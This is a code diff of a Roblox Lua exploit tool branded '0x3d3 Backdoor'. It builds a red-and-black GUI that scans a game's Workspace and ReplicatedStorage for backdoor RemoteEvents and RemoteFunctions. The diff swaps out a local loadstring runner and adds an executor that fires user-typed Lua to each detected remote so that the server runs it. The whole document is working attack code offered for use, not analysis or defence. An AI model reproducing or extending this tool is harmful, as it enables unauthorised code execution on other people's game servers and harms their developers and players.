@@ -2,12 +2,9 @@
 -- Colors: Red, Black, White theme
 -- Draggable window, scan suspicious backdoors in Workspace & ReplicatedStorage
 -- Execute scripts on detected RemoteEvents & RemoteFunctions
--- Notification when backdoor found
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Create main GUI
@@ -38,6 +35,7 @@ titleLabel.Text = "0x3d3 Backdoor"
 titleLabel.Parent = topBar
 
 -- Draggable logic
+local UserInputService = game:GetService("UserInputService")
 local dragging, dragInput, dragStart, startPos
 
 topBar.InputBegan:Connect(function(input)
@@ -237,103 +235,121 @@ local function clearScanResults()
     end
 end
 
--- Notification popup function
-local function showNotification(text)
-    local notifFrame = Instance.new("Frame")
-    notifFrame.Size = UDim2.new(0, 300, 0, 50)
-    notifFrame.Position = UDim2.new(0.5, -150, 0, 50)
-    notifFrame.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
-    notifFrame.BorderSizePixel = 0
-    notifFrame.Parent = screenGui
-
-    local notifText = Instance.new("TextLabel")
-    notifText.Size = UDim2.new(1, -20, 1, 0)
-    notifText.Position = UDim2.new(0, 10, 0, 0)
-    notifText.BackgroundTransparency = 1
-    notifText.Font = Enum.Font.GothamBold
-    notifText.TextSize = 18
-    notifText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    notifText.Text = text
-    notifText.Parent = notifFrame
-
-    -- Tween to fade out
-    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    local tween = TweenService:Create(notifFrame, tweenInfo, {BackgroundTransparency = 1})
-    tween:Play()
-    tween.Completed:Connect(function()
-        notifFrame:Destroy()
-    end)
-end
-
--- Scan function
 local function scanAll()
     clearScanResults()
-    local startTime = tick()
-    local foundCount = 0
-    local results = {}
-
-    scanContainer(workspace, results)
-    scanContainer(ReplicatedStorage, results)
-
-    suspiciousObjects = results
-
-    for i, obj in ipairs(results) do
-        appendLine(scannerOutput, string.format("[%d] Found: %s (%s)", i, obj.Name, obj.ClassName))
-        foundCount = foundCount + 1
-        showNotification("Backdoor Found: "..obj.Name.." in "..string.format("%.2f", tick() - startTime).." seconds")
-    end
-
-    if foundCount == 0 then
-        appendLine(scannerOutput, "No suspicious backdoors found.")
+    suspiciousObjects = {}
+    appendLine(scannerOutput, "Starting scan of workspace and ReplicatedStorage...")
+    scanContainer(workspace, suspiciousObjects)
+    scanContainer(ReplicatedStorage, suspiciousObjects)
+    if #suspiciousObjects == 0 then
+        appendLine(scannerOutput, "No suspicious backdoor objects found.")
+    else
+        appendLine(scannerOutput, "Found suspicious backdoor objects:")
+        for i, obj in ipairs(suspiciousObjects) do
+            appendLine(scannerOutput, i .. ". " .. obj:GetFullName() .. " [" .. obj.ClassName .. "]")
+        end
     end
 end
 
--- Scan Button
+-- Button to scan all
 local scanButton = Instance.new("TextButton")
-scanButton.Size = UDim2.new(0, 200, 0, 40)
-scanButton.Position = UDim2.new(0, 10, 1, -50)
+scanButton.Size = UDim2.new(0, 160, 0, 40)
+scanButton.Position = UDim2.new(0, 20, 0, 10)
 scanButton.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
-scanButton.Font = Enum.Font.GothamBold
-scanButton.TextSize = 20
 scanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-scanButton.Text = "Scan Workspace & ReplicatedStorage"
+scanButton.Font = Enum.Font.GothamBold
+scanButton.TextSize = 18
+scanButton.Text = "Scan All"
 scanButton.Parent = scannerFrame
+scanButton.MouseButton1Click:Connect(scanAll)
 
-scanButton.MouseButton1Click:Connect(function()
-    scanAll()
+-- Executor UI
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(1, -40, 0, 100)
+inputBox.Position = UDim2.new(0, 20, 0, 20)
+inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.Font = Enum.Font.Code
+inputBox.TextSize = 16
+inputBox.ClearTextOnFocus = false
+inputBox.MultiLine = true
+inputBox.PlaceholderText = "-- Enter Lua script here"
+inputBox.Parent = executorFrame
+
+local execButton = Instance.new("TextButton")
+execButton.Size = UDim2.new(0, 160, 0, 40)
+execButton.Position = UDim2.new(0, 20, 0, 130)
+execButton.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
+execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+execButton.Font = Enum.Font.GothamBold
+execButton.TextSize = 18
+execButton.Text = "Execute Script"
+execButton.Parent = executorFrame
+
+local execOutput = Instance.new("ScrollingFrame")
+execOutput.Size = UDim2.new(1, -40, 0, 200)
+execOutput.Position = UDim2.new(0, 20, 0, 180)
+execOutput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+execOutput.BorderSizePixel = 0
+execOutput.ScrollBarThickness = 8
+execOutput.CanvasSize = UDim2.new(0, 0, 0, 0)
+execOutput.Parent = executorFrame
+
+local execLayout = Instance.new("UIListLayout")
+execLayout.Padding = UDim.new(0, 2)
+execLayout.Parent = execOutput
+
+execLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    execOutput.CanvasSize = UDim2.new(0, 0, 0, execLayout.AbsoluteContentSize.Y + 10)
 end)
 
--- Executor UI --
+-- Append lines to executor output
+local function appendExecLine(text)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 0, 20)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 16
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Text = text
+    label.Parent = execOutput
+    return label
+end
 
-local scriptInput = Instance.new("TextBox")
-scriptInput.Size = UDim2.new(1, -20, 1, -80)
-scriptInput.Position = UDim2.new(0, 10, 0, 10)
-scriptInput.ClearTextOnFocus = false
-scriptInput.MultiLine = true
-scriptInput.Font = Enum.Font.Code
-scriptInput.TextSize = 16
-scriptInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-scriptInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-scriptInput.PlaceholderText = "Write Lua script here..."
-scriptInput.Parent = executorFrame
-
-local executeBtn = Instance.new("TextButton")
-executeBtn.Size = UDim2.new(0, 120, 0, 40)
-executeBtn.Position = UDim2.new(1, -130, 1, -50)
-executeBtn.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
-executeBtn.Font = Enum.Font.GothamBold
-executeBtn.TextSize = 18
-executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-executeBtn.Text = "Execute Script"
-executeBtn.Parent = executorFrame
-
-executeBtn.MouseButton1Click:Connect(function()
-    local success, err = pcall(function()
-        loadstring(scriptInput.Text)()
-    end)
-    if not success then
-        showNotification("Error: "..err)
-    else
-        showNotification("Script executed successfully.")
+-- Executor button logic
+execButton.MouseButton1Click:Connect(function()
+    local scriptText = inputBox.Text
+    if scriptText == "" then
+        appendExecLine("[Error] Please enter a script to execute.")
+        return
+    end
+    if #suspiciousObjects == 0 then
+        appendExecLine("[Warning] No suspicious backdoor objects found. Run Scan All first.")
+        return
+    end
+    appendExecLine("Executing script on detected backdoors...")
+    for _, obj in ipairs(suspiciousObjects) do
+        if obj:IsA("RemoteEvent") then
+            local success, err = pcall(function()
+                obj:FireServer(scriptText)
+            end)
+            if success then
+                appendExecLine("[Success] Fired script to " .. obj:GetFullName())
+            else
+                appendExecLine("[Failed] " .. obj:GetFullName() .. ": " .. err)
+            end
+        elseif obj:IsA("RemoteFunction") then
+            local success, result = pcall(function()
+                return obj:InvokeServer(scriptText)
+            end)
+            if success then
+                appendExecLine("[Success] Invoked script on " .. obj:GetFullName() .. ". Result: " .. tostring(result))
+            else
+                appendExecLine("[Failed] " .. obj:GetFullName() .. ": " .. result)
+            end
+        else
+            appendExecLine("[Skipped] " .. obj:GetFullName() .. " (" .. obj.ClassName .. ") - unsupported executor")
+        end
     end
 end)
